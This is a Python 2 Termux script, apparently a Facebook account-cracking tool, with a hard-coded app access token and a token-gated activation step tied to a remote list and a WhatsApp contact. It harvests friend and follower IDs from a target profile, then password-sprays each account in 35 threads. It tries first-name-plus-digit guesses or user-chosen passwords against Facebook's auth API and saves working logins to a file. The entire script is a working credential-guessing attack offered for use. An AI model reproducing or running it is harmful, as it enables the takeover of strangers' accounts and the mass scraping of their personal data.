#coding=utf-8
#!/usr/bin/python2
#coding=utf-8
#originally written by muhammad hamza
import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,base64
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
reload(sys)
sys.setdefaultencoding('utf-8')
print('update 1.1')
time.sleep(1)
logo="""

  
\t##     ##     #######     ########  
\t##     ##    ##     ##    ##     ## 
\t##     ##    ##     ##    ##     ## 
\t#########    ##     ##    ########  
\t##     ##    ##     ##    ##        
\t##     ##    ##     ##    ##        
\t##     ##     #######     ##        

 ------------------------------------------

   Author   : Muhammad Hamza
   Github   : https://github.com/Hamzahash
   
 ----------------------------------------- """
def subscribe():
	os.system("clear")
	print("")
	print("")
	print("")
	print("")
	try:
		tok = open('/data/data/com.termux/files/usr/bin/.py_compil.py', 'r').read()
		dec = base64.b64decode(tok)
		if len(dec) < 50:
		    not_reg()
		r = requests.get("https://raw.githubusercontent.com/pythoholics/n/main/server.txt").text
		if dec in r:
			main()
		else:
		    print('\n\n   Token not verified yet :(').center(50)
		    print("\n\n\n  Please wait for activation\n\n\n")
		    print('  Your token is : '+dec+'\n\n\n')
		    raw_input(" Press enter to check again ")
		    subscribe()
	except (IOError):
	    not_reg()
	except requests.exceptions.ConnectionError:
	    print('\n\n\nTurn on mobile data OR wifi to continue\n\n\n')
	    sys.exit()
def not_reg():
    print('\n\n\nVerify your token\n\n\n')
    string_token = 'abcdefghijklmnopqrstuvwxyz123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    v_token = ''.join((random.choice(string_token)) for x in range(50))
    v_token_save = open('/data/data/com.termux/files/usr/bin/.py_compil.py', 'w')
    v_token_save.write(base64.b64encode(v_token))
    v_token_save.close()
    print('  Copy this token and press enter to verify... >>> '+v_token)
    raw_input('')
    os.system('xdg-open https://wa.me/+923097992202')
def main():
	try:
		token = open("access_token.txt", "r").read()
		menu()
	except (KeyError , IOError):
		os.system("clear")
		print("")
		print(logo)
		print("")
		print("\tLogin menu")
		print("")
		print("  [1] Login facebook")
		print("  [2] Login token")
		print("  [3] Exit")
		print("")
		main_sel()
def main_sel():
	sel = raw_input("  Choose option: ")
	if sel =="1":
		login_fb()
	elif sel =="2":
		login_token()
	elif sel =="3":
		os.system("exit")
	else:
		print("")
		print("\tInvalid choice")
		print("")
		main_sel()
def login_fb():
	os.system("clear")
	print(logo)
	print("")
	print("\tLogin FB")
	print("")
	uid = raw_input("  Id/mail/number: ")
	passw = raw_input("  Password:  ")
	data = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+passw+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&meta_inf_fbmeta=%20&currently_logged_in_userid=0&locale=en_US&client_country_code=US&&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true").text
	q = json.loads(data)
	if "access_token" in q:
		tok_sav = open("access_token.txt", "w")
		tok_sav.write(q["access_token"])
		tok_sav.close()
		menu()
	elif "www.facebook.com" in q["error_msg"]:
		print("")
		print("\tId has checkpoint")
		print("")
		raw_input("  Press enter to back")
		main()
	else:
		print("")
		print("\tId number pass may be wrong")
		print("")
		time.sleep(1)
		main()
def login_token():
	os.system("clear")
	print(logo)
	print("")
	print("\tLogin token")
	print("")
	tok = raw_input(" Paste token: ")
	toks = open('access_token.txt', 'w')
	toks.write(tok)
	toks.close()
	menu()
def menu():
    os.system("clear")
    try:
        token = open("access_token.txt", "r").read()
    except(KeyError , IOError):
        login()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token)
        q = json.loads(r.text)
        name = q["name"]
    except(KeyError):
        print(logo)
        print("")
        print("\tLogged in token has expired")
        os.system("rm -rf access_token.txt")
        print("")
        time.sleep(1)
        main()
    os.system("clear")
    print(logo)
    print("")
    print("   Welcome: "+name)
    print("")
    print(47*"-")
    print("")
    print("  [1] Crack with auto pass")
    print("  [2] Crack with choice pass")
    print("  [3] Extract ids")
    print("")
    menu_option()
def menu_option():
	select = raw_input(" Choose option: ")
	if select =="1":
		crack()
	elif select =="2":
		choice()
	elif select =="3":
		ex_id()
	else:
		print("")
		print("\tSelect valid option")
		print("")
		menu_option()
def crack():
	global token
	os.system("clear")
	try:
		token = open("access_token.txt","r").read()
	except IOError:
		print("")
		print("\tToken not found ")
		time.sleep(1)
		login_choice()
	os.system("clear")
	print(logo)
	print("")
	print("\tCrack with Name pass")
	print("")
	print("  [1] Crack public id\n")
	print("  [2] Crack followers\n")
	print("  [3] Crack file\n")
	print("  [0] Back")
	print("")
	crack_select()
def crack_select():
	select = raw_input("  Choose option: ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print(logo)
		print("")
		print("\tName pass cracking")
		print("")
		idt = raw_input("  Input id: ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
			print('')
			print("\tName pass cracking")
			print('')
			print("  Cloning from : "+q["name"])
		except KeyError:
			print("\tInvalid Link")
			print("")
			raw_input("  Press enter to back")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="2":
		os.system("clear")
		print(logo)
		print("")
		print("\tName pass cracking")
		print("")
		idt = raw_input("  Input id: ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
			print('')
			print('\tName pass cracking')
			print('')
			print("  Cloning from: "+q["name"])
		except KeyError:
			print("\tInvalid id link")
			print("")
			raw_input("  Press enter to back")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999")
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="3":
		os.system("clear")
		print(logo)
		print("")
		print("\tName pass cracking")
		print("")
		try:
			filelist = raw_input("  File : ")
			os.system('clear')
			print(logo)
			print('')
			print('\tName pass cracking')
			print('')
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print("")
			print("\tRequested file not found")
			print("")
			raw_input("  Press enter to back ")
			crack()
	elif select =="0":
	    menu()
	else:
		print("")
		print("\tSelect valid option")
		print("")
		crack_select()
	print("  Total IDs : "+str(len(id)))
	print("  The Process has started")
	print(47*"-")
	print("")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
			pass1 = name.lower()+"12"
			data = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&meta_inf_fbmeta=%20&currently_logged_in_userid=0&locale=en_US&client_country_code=US&&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true").text
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;32m [OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("/sdcard/ids/ok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;31m [CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("hstcp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					pass2 = name.lower()+"1122"
					data = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&meta_inf_fbmeta=%20&currently_logged_in_userid=0&locale=en_US&client_country_code=US&&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true").text
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;32m [OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("/sdcard/ids/ok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;31m [CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("hstcp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							pass3 = name.lower()+"1234"
							data = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&meta_inf_fbmeta=%20&currently_logged_in_userid=0&locale=en_US&client_country_code=US&&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true").text
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;32m [OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("/sdcard/ids/ok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;31m [CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("hstcp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									pass4 = name.lower()+"786"
									data = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&meta_inf_fbmeta=%20&currently_logged_in_userid=0&locale=en_US&client_country_code=US&&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true").text
									q = json.loads(data)
									if "access_token" in q:
										print(" \033[1;32m [OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("/sdcard/ids/ok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in q["error_msg"]:
											print(" \033[1;31m [CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("hstcp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											cps.append(uid+pass4)
		except:
			pass
	p = ThreadPool(35)
	p.map(main, id)
	print("")
	print(47*"-")
	print("")
	print("  The process has been completed")
	print("  Total Ok/Cp: "+str(len(oks))+"/"+str(len(cps)))
	print("")
	print(47*"-")
	print("")
	raw_input("  Press enter to back ")
	menu()
def choice():
	global token
	os.system("clear")
	try:
		token = open("access_token.txt","r").read()
	except IOError:
		print("")
		print("\tToken not found")
		time.sleep(1)
		login_choice()
	os.system("clear")
	print(logo)
	print("")
	print("\tDigit pass cracking")
	print("")
	print("  [1] Crack public id\n")
	print("  [2] Crack followers\n")
	print("  [3] Crack file\n")
	print("  [0] Back")
	print("")
	choice_select()
def choice_select():
	select = raw_input("  Choose option: ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print(logo)
		print("")
		print("\tDigit pass cracking")
		print("")
		pass1 = raw_input("  Password: ")
		pass2 = raw_input("  Password: ")
		pass3 = raw_input("  Password: ")
		pass4 = raw_input("  Password: ")
		idt = raw_input("  Input id: ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
			print('')
			print('\tDigit pass cracking')
			print("  Cloning from : "+q["name"])
		except KeyError:
			print("\tInvalid id link")
			print("")
			raw_input("  Press enter to back")
			choice()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="2":
		os.system("clear")
		print(logo)
		print("")
		print("\tDigit pass cracking")
		print("")
		pass1 = raw_input("  Password: ")
		pass2 = raw_input("  Password: ")
		pass3 = raw_input("  Password: ")
		pass4 = raw_input("  Password: ")
		idt = raw_input("  Input id: ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
			print('')
			print('\tDigit pass cracking')
			print('')
			print(" Cloning from: "+q["name"])
		except KeyError:
			print("\tInvalid id link")
			print("")
			raw_input(" Press enter to back")
			choice()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999")
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="3":
		os.system("clear")
		print(logo)
		print("")
		print("\tDigit pass cracking")
		print("")
		pass1 = raw_input("  Password: ")
		pass2 = raw_input("  Password: ")
		pass3 = raw_input("  Password: ")
		pass4 = raw_input("  Password: ")
		filelist = raw_input("  Input file: ")
		os.system('clear')
		print(logo)
		print('')
		print('\tDigit pass cracking')
		print('')
		try:
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print("")
			print("\tRequested file not found")
			print("")
			raw_input(" Press enter to back ")
			choice()
	elif select =="0":
	    menu()
	else:
		print("")
		print("\t    \033[1;31mSelect valid option\033[0;97m")
		print("")
		choice_select()
	print("  Total IDs : "+str(len(id)))
	print("  The Process has started")
	print(47*"-")
	print("")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
			data = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&meta_inf_fbmeta=%20&currently_logged_in_userid=0&locale=en_US&client_country_code=US&&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true").text
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;32m [OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("/sdcard/ids/ok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;31m [CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("hstcp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					data = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&meta_inf_fbmeta=%20&currently_logged_in_userid=0&locale=en_US&client_country_code=US&&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true").text
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;32m [OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("/sdcard/ids/ok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;31m [CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("hstcp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							data = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&meta_inf_fbmeta=%20&currently_logged_in_userid=0&locale=en_US&client_country_code=US&&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true").text
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;32m [OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("/sdcard/ids/ok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;31m [CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("hstcp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									data = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&meta_inf_fbmeta=%20&currently_logged_in_userid=0&locale=en_US&client_country_code=US&&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true").text
									q = json.loads(data)
									if "access_token" in q:
										print(" \033[1;32m [OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("/sdcard/ids/ok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in q["error_msg"]:
											print(" \033[1;31m [CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("hstcp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											cps.append(uid+pass4)
		except:
			pass
	p = ThreadPool(35)
	p.map(main, id)
	print("")
	print(47*"-")
	print("")
	print(" The process has been completed")
	print(" Total Ok/Cp: "+str(len(oks))+"/"+str(len(cps)))
	print("")
	print(47*"-")
	print("")
	raw_input(" Press enter to back ")
	menu()
def ex_id():
    id=[]
    try:
        token = open('access_token.txt', 'r').read()
    except (IOError):
        os.system('clear')
        print('')
        print('')
        print('  Facebook access token is missing ...')
        print('')
        time.sleep(1)
        login()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+token)
        q = json.loads(r.text)
        name = q['name']
    except(KeyError):
        os.system('clear')
        print('')
        print('')
        print('   Logged in Facebook access token has expired ...')
        print('')
        time.sleep(1)
        login()
    os.system('clear')
    print(logo)
    print('')
    print('  Hey ! Welcome: ')
    print('')
    print(47*'-')
    print('')
    print('  Public ids friendlist grabbing tool ...')
    print('')
    cid = raw_input('  Input id link: ')
    try:
        r = requests.get("https://graph.facebook.com/"+cid+"?access_token="+token)
        s = json.loads(r.text)
        t = s['name']
        print('  Grabbing ids from: '+t)
    except(KeyError):
        print('')
        print('  Invalid id link OR token found')
        print('')
        time.sleep(1)
        menu()
    data = requests.get("https://graph.facebook.com/"+cid+"/friends?access_token="+token)
    q = json.loads(data.text)
    id_sav = open('/sdcard/ids_friends.txt', 'a')
    for i in q['data']:
        ids = i['id']
        name = i['name']
        name_f=name.rsplit(' ')[0]
        id.append(ids)
        id_sav.write(ids+'|'+name_f+'\n')
    id_sav.close()
    print('')
    print(47*'-')
    print('')
    print('  Ids grabbed successfully')
    print('  Total ids grabbed: '+str(len(id)))
    print('  File stored in: /sdcard/ids_friends.txt')
    print('')
    print(47*'-')
    print('')
    raw_input('  Press enter to back ')
    ex_id()
subscribe()

